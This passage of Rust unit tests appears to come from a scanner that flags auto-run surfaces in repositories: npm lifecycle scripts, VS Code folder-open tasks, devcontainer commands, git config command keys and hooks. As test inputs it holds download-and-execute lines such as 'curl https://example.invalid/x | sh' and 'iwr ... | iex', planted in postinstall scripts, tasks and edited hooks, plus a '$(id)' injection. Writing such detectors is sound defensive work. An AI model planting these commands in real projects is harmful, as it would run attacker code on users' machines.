            "[filter \"lfs\"]\n\tsmudge = ./c.sh\n",
            "[filter \"lfs\"]\n\tprocess = ./c.sh\n",
            "[diff \"x\"]\n\ttextconv = ./t.sh\n",
            "[alias]\n\tco = !./x.sh\n",
            "[alias]\n\tco = \"!./x.sh\"\n",
            "[CORE]\n\tFsMonitor = ./hook.sh\n",
        ] {
            let (s, out) = run(".git/config", text);
            assert!(s.is_empty());
            assert_eq!(rules(&out), ["autorun.git-config-command"], "{text:?}");
            assert_eq!(out[0].severity, Severity::High, "{text:?}");
            assert_eq!(out[0].path, ".git/config");
        }
    }

    #[test]
    fn plain_git_config_is_clean() {
        let (_, out) = run(
            ".git/config",
            "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tfsmonitor = false\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/a.git\n[alias]\n\tco = checkout\n[filter \"lfs\"]\n\trequired = true\n[diff \"x\"]\n\tbinary = true\n",
        );
        assert!(out.is_empty(), "{out:?}");
        // A config that is not in a .git folder is not read.
        let (_, out) = run("sub/git/config", "[core]\n\tfsmonitor = ./x\n");
        assert!(out.is_empty());
    }

    // .npmrc and Yarn

    #[test]
    fn npmrc_settings_that_change_what_runs_are_medium() {
        for (text, line) in [
            ("ignore-scripts=false\n", 1),
            ("; comment\nscript-shell=./sh.sh\n", 2),
            ("node-options=--require ./x.js\n", 1),
            ("registry=https://example.invalid/npm/\n", 1),
            (
                "registry = https://registry.npmjs.org.example.invalid/\n",
                1,
            ),
            ("@scope:registry=https://example.invalid/npm/\n", 1),
            ("registry=example.invalid\n", 1),
        ] {
            for path in [".npmrc", "app/.npmrc"] {
                let (_, out) = run(path, text);
                let f = named(&out, "autorun.npmrc");
                assert_eq!((f.severity, f.line), (Severity::Medium, line), "{text}");
            }
        }
    }

    #[test]
    fn npmrc_defaults_are_clean() {
        let (_, out) = run(
            ".npmrc",
            "ignore-scripts=true\nregistry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${NPM_TOKEN}\nsave-exact=true\n# registry=https://example.invalid/\n",
        );
        assert!(out.is_empty(), "{out:?}");
        let (_, out) = run("x.npmrc", "ignore-scripts=false\n");
        assert!(out.is_empty());
    }

    #[test]
    fn a_yarn_path_outside_releases_is_high() {
        for (path, text, line) in [
            (
                ".yarnrc.yml",
                "nodeLinker: node-modules\nyarnPath: scripts/yarn.cjs\n",
                2,
            ),
            (".yarnrc.yml", "yarnPath: \"./bin/yarn.cjs\"\n", 1),
            (".yarnrc.yml", "yarnPath: .yarn/releases/../../x.cjs\n", 1),
            (".yarnrc.yml", "yarnPath: /opt/yarn.cjs\n", 1),
            (".yarnrc", "yarn-path \"scripts/yarn.js\"\n", 1),
            (".yarnrc", "yarn-path scripts/yarn.js\n", 1),
        ] {
            let (_, out) = run(path, text);
            let f = named(&out, "autorun.yarn-path");
            assert_eq!((f.severity, f.line), (Severity::High, line), "{text}");
        }
    }

    #[test]
    fn a_yarn_path_under_releases_is_clean() {
        for (path, text) in [
            (".yarnrc.yml", "yarnPath: .yarn/releases/yarn-3.6.4.cjs\n"),
            (
                ".yarnrc.yml",
                "yarnPath: \"./.yarn/releases/yarn-3.6.4.cjs\"\n",
            ),
            (".yarnrc.yml", "nodeLinker: node-modules\n"),
            (".yarnrc", "yarn-path \".yarn/releases/yarn-1.22.19.cjs\"\n"),
        ] {
            let (_, out) = run(path, text);
            assert!(out.is_empty(), "{text}: {out:?}");
        }
    }

    // The inventory and the shape of the whole

    #[test]
    fn a_file_with_surfaces_gets_one_inventory_finding_and_one_without_gets_none() {
        let (s, out) = run("Taskfile.yml", TASKFILE);
        assert_eq!(s.len(), 5);
        let inventory: Vec<_> = out
            .iter()
            .filter(|f| f.rule == "autorun.inventory")
            .collect();
        assert_eq!(inventory.len(), 1);
        assert_eq!(
            (
                inventory[0].severity,
                inventory[0].count,
                inventory[0].path.as_str()
            ),
            (Severity::Info, 5, "Taskfile.yml")
        );
        assert!(inventory[0].why.contains("autorun.taskfile"));
        let (_, out) = run("package.json", r#"{"scripts":{"build":"tsc"}}"#);
        assert!(out.is_empty());
    }

    #[test]
    fn every_finding_is_autorun_with_a_why_and_an_action() {
        let samples = [
            ("package.json", LIFECYCLE),
            (".cargo/config.toml", "[build]\nrustc = \"x\"\n"),
            (
                ".gitmodules",
                "[submodule \"a\"]\n\tpath = a\n\turl = http://x\n",
            ),
            (".npmrc", "ignore-scripts=false\n"),
            (".vscode/tasks.json", "{"),
        ];
        for (path, text) in samples {
            let (_, out) = run(path, text);
            assert!(!out.is_empty(), "{path}");
            for f in &out {
                assert_eq!(f.group, Group::Autorun, "{f:?}");
                assert_eq!(f.path, path);
                assert!(
                    !f.why.is_empty() && !f.action.is_empty() && f.count >= 1,
                    "{f:?}"
                );
            }
        }
    }

    // Evasions found in review: stray bytes, parse failures, command arrays, git config forms.

    fn bytes_ctx<'a>(path: &'a str, bytes: &'a [u8]) -> FileCtx<'a> {
        FileCtx {
            path,
            bytes,
            text: None,
            kind: FileKind::Config,
            truncated: false,
        }
    }

    #[test]
    fn a_file_with_no_decoded_text_is_still_read_from_its_bytes() {
        let pkg = b"{\"description\":\"\xff\",\"scripts\":{\"postinstall\":\"node a.js\"}}";
        let mut out = Vec::new();
        let s = surfaces(&bytes_ctx("package.json", pkg), &mut out);
        assert_eq!(commands(&s), ["node a.js"]);
        let tasks = b"{\"tasks\":[{\"command\":\"make\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]} // \xff";
        let s = surfaces(&bytes_ctx(".vscode/tasks.json", tasks), &mut Vec::new());
        assert_eq!(commands(&s), ["make"]);
        let cfg = b"[core]\n\tfsmonitor = ./hook.sh\n# \xff\n";
        let mut out = Vec::new();
        surfaces(&bytes_ctx(".git/config", cfg), &mut out);
        assert_eq!(
            named(&out, "autorun.git-config-command").severity,
            Severity::High
        );
    }

    #[test]
    fn an_unparsable_package_json_is_high_and_its_raw_text_is_read() {
        for text in [
            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}} junk"#,
            r#"{"scripts":{"postinstall":"curl https://example.invalid/x | sh""#,
        ] {
            let (s, out) = run("package.json", text);
            assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
            let curl = "curl https://example.invalid/x | sh";
            assert!(
                commands(&s).iter().any(|c| c.contains(curl)),
                "{text}: {s:?}"
            );
            assert!(s.iter().all(|x| x.trigger == Trigger::Install), "{s:?}");
        }
        let (s, _) = run(
            "package.json",
            r#"{"scripts":{"postinstall":"node a.js", "build": "x""#,
        );
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(s[0].rule, "autorun.npm-lifecycle");
    }

    #[test]
    fn padding_before_the_scripts_does_not_hide_them() {
        let text = format!(
            "{{\"x\":\"{}\",\"scripts\":{{\"postinstall\":\"node a.js\"}}",
            " ".repeat(3 << 20)
        );
        let (s, out) = run("package.json", &text);
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn an_unparsable_tasks_file_is_high_and_a_folder_open_command_is_still_found() {
        let text = r#"{"tasks":[{"label":"x","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}  "#;
        let (s, out) = run(".vscode/tasks.json", text);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert!(
            commands(&s)
                .iter()
                .any(|c| c.contains("curl https://example.invalid/x | sh"))
        );
        // Without folderOpen nothing runs on open; the failure alone is the finding.
        let (s, out) = run(".vscode/tasks.json", r#"{"tasks":[{"command":"make"} "#);
        assert!(s.is_empty());
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn an_unparsable_devcontainer_is_high_and_initialize_command_is_still_found() {
        let text = r#"{"initializeCommand": ["bash","-c","curl https://example.invalid/x | sh"], "image": "#;
        let (s, out) = run(".devcontainer.json", text);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
        all_are(
            &s,
            "autorun.devcontainer-host",
            Trigger::Open,
            Severity::Info,
        );
        assert!(
            commands(&s)
                .iter()
                .any(|c| c.contains("curl https://example.invalid/x | sh"))
        );
        let text = r#"{"initializeCommand": "node a.js", "image": "#;
        assert_eq!(commands(&run(".devcontainer.json", text).0), ["node a.js"]);
    }

    #[test]
    fn task_commands_can_be_arrays() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[
  {"label":"a","command":["bash","-c","curl https://example.invalid/x | sh"],"runOptions":{"runOn":"folderOpen"}},
  {"label":"b","command":{"value":["node","a.js"]},"runOptions":{"runOn":"folderOpen"}},
  {"label":"c","command":"x","windows":{"command":["powershell","-c","iwr https://example.invalid/x | iex"]},"runOptions":{"runOn":"folderOpen"}}
]}"#,
        );
        assert_eq!(
            commands(&s),
            [
                r#"bash -c "curl https://example.invalid/x | sh""#,
                "node a.js",
                "x",
                r#"powershell -c "iwr https://example.invalid/x | iex""#
            ]
        );
    }

    #[test]
    fn git_config_header_line_entries_and_old_subsections_are_read() {
        for text in [
            "[core] fsmonitor = ./hook.sh\n",
            "[filter.lfs]\n\tclean = ./c.sh\n",
            "[filter \"x\"] smudge = ./c.sh\n",
            "[alias] co = !./x.sh\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert_eq!(
                named(&out, "autorun.git-config-command").severity,
                Severity::High,
                "{text:?}"
            );
        }
    }

    #[test]
    fn git_config_keys_that_name_a_program_are_high() {
        for text in [
            "[credential]\n\thelper = !./h.sh\n",
            "[credential \"https://example.invalid\"]\n\thelper = ./h\n",
            "[core]\n\taskPass = ./a\n",
            "[core]\n\tgitProxy = ./p\n",
            "[sequence]\n\teditor = ./e\n",
            "[gpg]\n\tprogram = ./g\n",
            "[gpg \"ssh\"]\n\tprogram = ./g\n",
            "[diff]\n\texternal = ./d\n",
            "[diff \"x\"]\n\tcommand = ./d\n",
            "[merge \"x\"]\n\tdriver = ./m %O\n",
            "[remote \"o\"]\n\tuploadpack = ./u\n",
            "[remote \"o\"]\n\treceivepack = ./u\n",
            "[submodule \"s\"]\n\tupdate = !./u\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert_eq!(
                named(&out, "autorun.git-config-command").severity,
                Severity::High,
                "{text:?}"
            );
        }
    }

    #[test]
    fn git_config_keys_with_ordinary_values_are_clean() {
        let (_, out) = run(
            ".git/config",
            "[credential]\n\thelper = store\n[credential \"https://example.invalid\"]\n\thelper = cache --timeout=3600\n[submodule \"s\"]\n\tupdate = checkout\n\turl = https://example.invalid/s.git\n[merge \"x\"]\n\tname = a merge\n[gpg]\n\tformat = ssh\n[remote \"o\"]\n\tfetch = +refs/heads/*:refs/remotes/o/*\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn git_config_include_is_high() {
        for text in [
            "[include]\n\tpath = ../x\n",
            "[includeIf \"gitdir:/\"]\n\tpath = /etc/x\n",
            "[include] path = x\n",
        ] {
            let (_, out) = run(".git/config", text);
            let f = named(&out, "autorun.git-config-include");
            assert_eq!(f.severity, Severity::High, "{text:?}");
        }
    }

    #[test]
    fn the_husky_hooks_path_is_low_and_any_other_is_high() {
        for value in [".husky", ".husky/_"] {
            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
            assert_eq!(rules(&out), ["autorun.git-config-command"]);
            assert_eq!(out[0].severity, Severity::Low, "{value}");
        }
        for value in [".githooks", ".husky/../x", "/tmp/h", ".husky2"] {
            let (_, out) = run(".git/config", &format!("[core]\n\thooksPath = {value}\n"));
            assert_eq!(out[0].severity, Severity::High, "{value}");
        }
        // A husky path beside a command is still HIGH.
        let (_, out) = run(
            ".git/config",
            "[core]\n\thooksPath = .husky\n\tfsmonitor = ./x\n",
        );
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn nested_and_worktree_git_configs_are_read() {
        for path in [
            "sub/.git/config",
            "a/b/.git/config",
            ".git/config.worktree",
            "sub/.git/config.worktree",
        ] {
            let (_, out) = run(path, "[core]\n\tfsmonitor = ./x\n");
            let f = named(&out, "autorun.git-config-command");
            assert_eq!((f.severity, f.path.as_str()), (Severity::High, path));
        }
    }

    const PRE_COMMIT_STUB: &str = "#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\n# ID: 138fd403232d2ddd5efb44317e38bf03\n\n# start templated\nINSTALL_PYTHON=/usr/bin/python3\nARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)\n# end templated\n\nHERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nARGS+=(--hook-dir \"$HERE\" -- \"$@\")\n\nif [ -x \"$INSTALL_PYTHON\" ]; then\n    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"\nelif command -v pre-commit > /dev/null; then\n    exec pre-commit \"${ARGS[@]}\"\nelse\n    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2\n    exit 1\nfi\n";

    const LFS_STUB: &str = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/pre-push' file in the repository.\\n\"; exit 2; }\ngit lfs pre-push \"$@\"\n";

    const LEFTHOOK_STUB: &str = "#!/bin/sh\n\nif [ \"$LEFTHOOK_VERBOSE\" = \"1\" -o \"$LEFTHOOK_VERBOSE\" = \"true\" ]; then\n  set -x\nfi\n\nif [ \"$LEFTHOOK\" = \"0\" ]; then\n  exit 0\nfi\n\ncall_lefthook()\n{\n  if lefthook -h >/dev/null 2>&1\n  then\n    lefthook \"$@\"\n  else\n    echo \"Can't find lefthook in PATH\"\n  fi\n}\n\ncall_lefthook run \"pre-commit\" \"$@\"\n";

    /// The severity the entry finding of a hook has after the orchestrator offers its text.
    fn hook_severity(path: &str, text: &str) -> Severity {
        let mut out = Vec::new();
        entry_findings(&[path], &mut out);
        assert_eq!(out.len(), 1, "{path}");
        lower_hook_stubs(&ctx(path, text), &mut out);
        out[0].severity
    }

    const LFS_PRINTF_STUB: &str = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";

    #[test]
    fn the_newer_git_lfs_stub_is_low_and_a_command_in_its_message_is_not() {
        assert_eq!(
            hook_severity(".git/hooks/post-checkout", LFS_PRINTF_STUB),
            Severity::Low
        );
        let sneaky = LFS_PRINTF_STUB.replace("usually '.git/hooks'", "usually '$(id)'");
        assert_eq!(
            hook_severity(".git/hooks/post-checkout", &sneaky),
            Severity::High
        );
        let appended = format!("{LFS_PRINTF_STUB}curl https://example.invalid/x | sh\n");
        assert_eq!(
            hook_severity(".git/hooks/post-checkout", &appended),
            Severity::High
        );
    }

    #[test]
    fn a_hook_file_is_offered_through_raise_gitattributes_filters() {
        // The orchestrator offers every hook file to this one function.
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        let hook = ctx(".git/hooks/pre-commit", PRE_COMMIT_STUB);
        raise_gitattributes_filters(&hook, &mut out);
        assert_eq!(out[0].severity, Severity::Low);
        assert!(is_git_hook(".git/hooks/pre-commit"));
        assert!(is_git_hook("sub/.git/hooks/pre-push"));
        assert!(!is_git_hook(".git/hooks/pre-push.sample"));
        assert!(!is_git_hook(".git/config"));
    }

    #[test]
    fn hook_installer_stubs_are_low() {
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", PRE_COMMIT_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-push", LFS_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", LEFTHOOK_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity("sub/.git/hooks/pre-commit", PRE_COMMIT_STUB),
            Severity::Low
        );
        // A CRLF copy of a stub is the same stub.
        let crlf = PRE_COMMIT_STUB.replace('\n', "\r\n");
        assert_eq!(hook_severity(".git/hooks/pre-commit", &crlf), Severity::Low);
        // The finding says what it is.
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        lower_hook_stubs(&ctx(".git/hooks/pre-commit", PRE_COMMIT_STUB), &mut out);
        assert!(out[0].why.contains("pre-commit"), "{}", out[0].why);
    }

    #[test]
    fn an_edited_hook_stub_is_high() {
        let evil = "curl https://example.invalid/x | sh\n";
        for (path, stub) in [
            (".git/hooks/pre-commit", PRE_COMMIT_STUB),
            (".git/hooks/pre-push", LFS_STUB),
            (".git/hooks/pre-commit", LEFTHOOK_STUB),
        ] {
            let appended = format!("{stub}{evil}");
            assert_eq!(
                hook_severity(path, &appended),
                Severity::High,
                "{path} appended"
            );
            let inserted = stub.replacen('\n', &format!("\n{evil}"), 1);
            assert_eq!(
                hook_severity(path, &inserted),
                Severity::High,
                "{path} inserted"
            );
        }
        let swapped = PRE_COMMIT_STUB.replace("exec pre-commit", "exec ./pre-commit");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &swapped),
            Severity::High
        );
        let other_file = LEFTHOOK_STUB.replace("lefthook -h", "node run.js");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &other_file),
            Severity::High
        );
        // A stub under the wrong hook name, an unknown hook and a header alone are not stubs.
        assert_eq!(
            hook_severity(".git/hooks/post-merge", LFS_STUB),
            Severity::High
        );
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n"),
            Severity::High
        );
        let header = PRE_COMMIT_STUB
            .lines()
            .take(3)
            .collect::<Vec<_>>()
            .join("\n");
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", &header),
            Severity::High
        );
    }

    #[test]
    fn offering_another_file_leaves_hook_findings_alone() {
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        lower_hook_stubs(&ctx("README.md", PRE_COMMIT_STUB), &mut out);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn vscode_settings_that_name_a_program_inside_the_repo_are_high() {
        for (key, value) in [
            ("python.defaultInterpreterPath", "./venv/bin/python"),
            (
                "python.defaultInterpreterPath",
                "${workspaceFolder}/.venv/bin/python",
            ),
            ("typescript.tsdk", "tools/ts/lib"),
            ("eslint.runtime", "scripts/node"),
            ("git.path", "bin/git"),
            ("rust-analyzer.server.path", "./ra"),
            ("clangd.path", "tools/clangd"),
            ("go.goroot", "${workspaceRoot}/go"),
        ] {
            let text = format!("{{\"editor.fontSize\": 12,\n \"{key}\": \"{value}\"}}");
            let (_, out) = run(".vscode/settings.json", &text);
            let f = named(&out, "autorun.vscode-program");
            assert_eq!((f.severity, f.line), (Severity::High, 2), "{key} {value}");
        }
    }

    #[test]
    fn vscode_settings_that_name_a_program_outside_the_repo_are_medium() {
        for (key, value) in [
            ("python.defaultInterpreterPath", "/usr/bin/python3"),
            ("git.path", "~/bin/git"),
            ("eslint.runtime", "${env:HOME}/bin/node"),
            (
                "python.defaultInterpreterPath",
                "${userHome}/.venv/bin/python",
            ),
            ("git.path", "C:\\\\tools\\\\git.exe"),
            // An installed dependency, not code the repo ships.
            ("typescript.tsdk", "node_modules/typescript/lib"),
            ("typescript.tsdk", "./node_modules/typescript/lib"),
        ] {
            let text = format!("{{\"{key}\": \"{value}\"}}");
            let (_, out) = run(".vscode/settings.json", &text);
            let f = named(&out, "autorun.vscode-program");
            assert_eq!(f.severity, Severity::Medium, "{key} {value}");
        }
    }

    #[test]
    fn vscode_settings_with_bare_names_or_other_keys_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"python.defaultInterpreterPath": "python3", "git.path": "git", "eslint.runtime": "node", "myext.path": "./x", "editor.fontSize": 12, "typescript.tsdk": ""}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    const WORKSPACE: &str = r#"{
  "folders": [{"path": "."}],
  "settings": {"git.path": "./bin/git", "terminal.integrated.env.linux": {"A": "b"}},
  "tasks": {"version": "2.0.0", "tasks": [
    {"label": "x", "command": "curl https://example.invalid/x | sh", "runOptions": {"runOn": "folderOpen"}}
  ]}
}"#;

    #[test]
    fn a_code_workspace_gets_the_rules_of_settings_and_tasks() {
        let (s, out) = run("app/dev.code-workspace", WORKSPACE);
        assert_eq!(commands(&s), ["curl https://example.invalid/x | sh"]);
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].dir, "app");
        assert_eq!(
            named(&out, "autorun.vscode-program").severity,
            Severity::High
        );
        assert_eq!(named(&out, "autorun.vscode-env").severity, Severity::Medium);
        let (_, out) = run(
            "x.code-workspace",
            r#"{"settings": {"files.exclude": {"**/.vscode": true}}}"#,
        );
        assert_eq!(
            named(&out, "autorun.vscode-hidden").severity,
            Severity::High
        );
        // Nothing to read: no finding. A workspace that does not parse is HIGH.
        let (s, out) = run("x.code-workspace", r#"{"folders": [{"path": "."}]}"#);
        assert!(s.is_empty() && out.is_empty());
        let (_, out) = run("x.code-workspace", r#"{"settings": "#);
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    // Hostile files: work stays linear and the stack stays small.

    // These tests compare two runs of the same machine at the same moment (a 10x larger input,
    // or a huge name against a tiny one), never wall time against a fixed bound, so a busy CI
    // host slows both sides alike. A quadratic bug shows as about 100x on 10x the input; the bound
    // is 40x, with a 20 ms floor so a very fast small run cannot make the bound too tight.

    fn time_of(mut f: impl FnMut()) -> std::time::Duration {
        let started = std::time::Instant::now();
        f();
        started.elapsed()
    }

    /// The best of three runs: a one-off stall on a shared host does not count.
    fn best_of_three(mut f: impl FnMut()) -> std::time::Duration {
        (0..3).map(|_| time_of(&mut f)).min().expect("three runs")
    }

    fn assert_comparable(what: &str, base: std::time::Duration, big: std::time::Duration) {
        let bound = base.max(std::time::Duration::from_millis(20)) * 40;
        assert!(big < bound, "{what}: {big:?} against a base of {base:?}");
    }

    /// `work(n)` on 10x the input costs no more than about 40x `work(n)`.
    fn assert_linear(what: &str, small: usize, mut work: impl FnMut(usize)) {
        let base = best_of_three(|| work(small));
        let big = time_of(|| work(small * 10));
        assert_comparable(what, base, big);
    }

    #[test]
    fn a_long_chain_of_dependent_tasks_does_not_overflow_the_stack() {
        let chain = |length: usize| {
            let mut tasks = vec![
                r#"{"label":"t0","dependsOn":"t1","runOptions":{"runOn":"folderOpen"}}"#
                    .to_string(),
            ];
            for i in 1..length {
                tasks.push(format!(r#"{{"label":"t{i}","dependsOn":"t{}"}}"#, i + 1));
            }
            tasks.push(format!(r#"{{"label":"t{length}","command":"make"}}"#));
            format!(r#"{{"tasks":[{}]}}"#, tasks.join(","))
        };
        let (_, out) = run(".vscode/tasks.json", &chain(100_000));
        assert!(out.iter().all(|f| f.rule != "autorun.unparsed"));
        assert_linear("a dependsOn chain", 10_000, |n| {
            let _ = run(".vscode/tasks.json", &chain(n));
        });
    }

    #[test]
    fn a_deeply_nested_initialize_command_does_not_overflow_the_stack() {
        let text = format!(
            r#"{{"initializeCommand":{}"echo hi"{}}}"#,
            r#"{"a":"#.repeat(50_000),
            "}".repeat(50_000)
        );
        let (s, _) = run(".devcontainer.json", &text);
        assert!(s.len() <= 1);
    }

    #[test]
    fn a_file_of_continued_lines_is_read_in_linear_time() {
        let (s, _) = run("Makefile", &"a \\\n".repeat(200_000));
        assert!(s.is_empty());
        assert_linear("continued lines", 20_000, |n| {
            let _ = run("Makefile", &"a \\\n".repeat(n));
        });
    }

    #[test]
    fn a_huge_section_name_is_not_copied_for_every_entry() {
        // Copying the name per entry would cost 100,000 x 1 MiB; the same entries under a
        // one-byte name are the baseline.
        let entries = "a = b\n".repeat(100_000);
        for (path, header) in [
            (".git/config", String::new()),
            (".gitmodules", "submodule ".to_string()),
        ] {
            let text_for = |name: &str| format!("[{header}{name}]\n{entries}");
            let (small, big) = (text_for("s"), text_for(&"s".repeat(1 << 20)));
            let base = best_of_three(|| {
                let _ = run(path, &small);
            });
            let huge = time_of(|| {
                let _ = run(path, &big);
            });
            assert_comparable(path, base, huge);
        }
    }

    #[test]
    fn many_msbuild_commands_get_their_lines_in_one_pass() {
        let project = |n: usize| {
            format!(
                "<Project>{}</Project>",
                "<Exec Command=\"a\" />\n".repeat(n)
            )
        };
        let (s, _) = run("App.csproj", &project(100_000));
        assert_eq!(s.len(), 100_000);
        assert_eq!((s[0].line, s[99_999].line), (1, 100_000));
        assert_linear("Exec elements", 10_000, |n| {
            let _ = run("App.csproj", &project(n));
        });
    }

    // FW8b. N1: names are matched without regard to case.

    fn outcome(path: &str, text: &str) -> Vec<String> {
        let (s, out) = run(path, text);
        let mut got: Vec<String> = s
            .iter()
            .map(|x| format!("{} {} {:?}", x.rule, x.command, x.trigger))
            .collect();
        got.extend(out.iter().map(|f| format!("{} {:?}", f.rule, f.severity)));
        got
    }

    fn alternating(s: &str) -> String {
        s.chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect()
    }

    #[test]
    fn every_name_is_matched_without_regard_to_case() {
        let open_task =
            r#"{"tasks":[{"label":"a","command":"make","runOptions":{"runOn":"folderOpen"}}]}"#;
        let hidden = r#"{"files.exclude":{"**/.vscode":true}}"#;
        let backend = "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"backend\"\nbackend-path = [\"_build\"]\n";
        let wrapper = "distributionUrl=https://example.invalid/g.zip\n";
        let cases: Vec<(&str, &str)> = vec![
            ("package.json", LIFECYCLE),
            (".vscode/tasks.json", open_task),
            (".vscode/settings.json", hidden),
            (
                "x.code-workspace",
                r#"{"settings":{"files.exclude":{"**/.vscode":true}}}"#,
            ),
            (
                ".devcontainer/devcontainer.json",
                r#"{"initializeCommand":"make"}"#,
            ),
            (".devcontainer.json", r#"{"initializeCommand":"make"}"#),
            ("Makefile", "all:\n\tcurl https://example.invalid/x | sh\n"),
            (".envrc", "make\n"),
            (".pre-commit-config.yaml", PRE_COMMIT),
            (".husky/pre-commit", "make\n"),
            ("justfile", "build:\n  make\n"),
            ("Taskfile.yml", TASKFILE),
            (
                "App.csproj",
                r#"<Project><Target Name="x"><Exec Command="make" /></Target></Project>"#,
            ),
            ("setup.py", "from setuptools import setup\nsetup()\n"),
            ("pyproject.toml", backend),
            (".cargo/config.toml", "[build]\nrustc-wrapper = \"./w\"\n"),
            ("gradle/wrapper/gradle-wrapper.properties", wrapper),
            (".mvn/wrapper/maven-wrapper.properties", wrapper),
            (
                ".gitmodules",
                "[submodule \"a\"]\n\tpath = a\n\turl = https://example.invalid/a.git\n",
            ),
            (".gitattributes", "*.dat filter=scrub\n"),
            (".git/config", "[core]\n\tfsmonitor = ./x\n"),
            (".git/config.worktree", "[core]\n\tfsmonitor = ./x\n"),
            (".npmrc", "ignore-scripts=false\n"),
            (".yarnrc.yml", "yarnPath: ./x.js\n"),
            ("build.rs", ""),
            (".mvn/extensions.xml", ""),
        ];
        for (path, text) in cases {
            let want = outcome(path, text);
            assert!(
                !want.is_empty(),
                "{path} gives nothing, so it proves nothing"
            );
            for variant in [path.to_ascii_uppercase(), alternating(path)] {
                assert_eq!(outcome(&variant, text), want, "{variant}");
            }
        }
        // An installed dependency is skipped whatever the case of the folder.
        let (s, _) = run("NODE_MODULES/x/Package.json", LIFECYCLE);
        assert!(s.is_empty());
    }

    #[test]
    fn git_hooks_are_matched_without_regard_to_case() {
        let mut out = Vec::new();
        entry_findings(
            &[
                ".GIT/Hooks/pre-commit",
                "sub/.Git/HOOKS/pre-push",
                ".GIT/HOOKS/PRE-COMMIT.SAMPLE",
                ".git/hooks/applypatch-msg.Sample",
            ],
            &mut out,
        );
        assert_eq!(
            out.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(),
            [".GIT/Hooks/pre-commit", "sub/.Git/HOOKS/pre-push"]
        );
        assert!(is_git_hook(".GIT/hooks/Pre-Commit"));
        // A stock stub under a differently cased hook name is still lowered.
        assert_eq!(
            hook_severity(".GIT/HOOKS/PRE-COMMIT", PRE_COMMIT_STUB),
            Severity::Low
        );
        assert_eq!(
            hook_severity(".Git/Hooks/Pre-Push", LFS_STUB),
            Severity::Low
        );
        // The hook file itself is not read as another kind of file.
        let (s, out) = run(
            ".GIT/HOOKS/pre-commit",
            "curl https://example.invalid/x | sh\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    // N6: VS Code task options.

    fn open_task(extra: &str) -> String {
        format!(
            r#"{{"version":"2.0.0","tasks":[{{"label":"t","command":"echo hi","runOptions":{{"runOn":"folderOpen"}}{extra}}}]}}"#
        )
    }

    fn runs_file(s: &[Surface], file: &str) -> bool {
        s.iter()
            .any(|x| shape::files_run(&x.command).contains(&file.to_string()))
    }

    #[test]
    fn a_task_shell_inside_the_repo_is_a_file_the_task_runs() {
        for extra in [
            r#","options":{"shell":{"executable":"./tools/sh","args":["-c"]}}"#,
            r#","options":{"shell":{"executable":"${workspaceFolder}/tools/sh"}}"#,
            r#","options":{"shell":{"executable":"${workspaceRoot}\\tools/sh"}}"#,
            r#","options":{"shell":{"executable":"tools/sh"}}"#,
            r#","linux":{"options":{"shell":{"executable":"./tools/sh"}}}"#,
            r#","osx":{"command":"echo hi","options":{"shell":{"executable":"tools/sh"}}}"#,
            r#","windows":{"options":{"shell":{"executable":"./tools/sh"}}}"#,
        ] {
            let (s, _) = run(".vscode/tasks.json", &open_task(extra));
